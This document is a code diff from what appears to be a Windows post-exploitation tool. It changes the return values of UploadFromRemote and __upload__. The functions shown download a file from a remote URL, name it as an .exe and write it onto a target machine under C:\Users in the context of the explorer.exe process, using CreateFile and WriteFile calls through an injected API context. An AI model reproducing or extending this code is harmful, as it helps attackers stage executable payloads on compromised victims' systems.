@@ -37,10 +37,10 @@ def UploadFromRemote(helper, url):
     import requests
 
     response = requests.get(url)
-    if response.status_code != 200: return False
+    if response.status_code != 200: return None
 
     try: Filename = '%s.exe' % re.findall('filename=(.*)', response.headers['Content-Disposition'])[0]
-    except: return False
+    except: return None
     
     Data = requests.get(url).content
 
@@ -56,19 +56,19 @@ def __upload__(helper, Filename, Data, process='explorer.exe', path='C:\\Users\\
 
     hFile = api.CreateFile(bytes(filename.encode('utf8')))
     helper.logger.info('CreateFile: %x', hFile)
-    if hFile == 0xffffffffffffffff: return False
+    if hFile == 0xffffffffffffffff: return None
 
     Status = api.WriteFile(hFile, Data)
     helper.logger.info('WriteFile: %x', Status)
-    if not Status: return False
+    if not Status: return None
     
     Status = api.CloseHandle(hFile)
     helper.logger.info('CloseHandle: %x', Status)
-    if not Status: return False
+    if not Status: return None
 
     api.ReleaseContext()
 
-    return True
+    return Filename
 
 def __download__(helper, files, output, process='explorer.exe'):
 
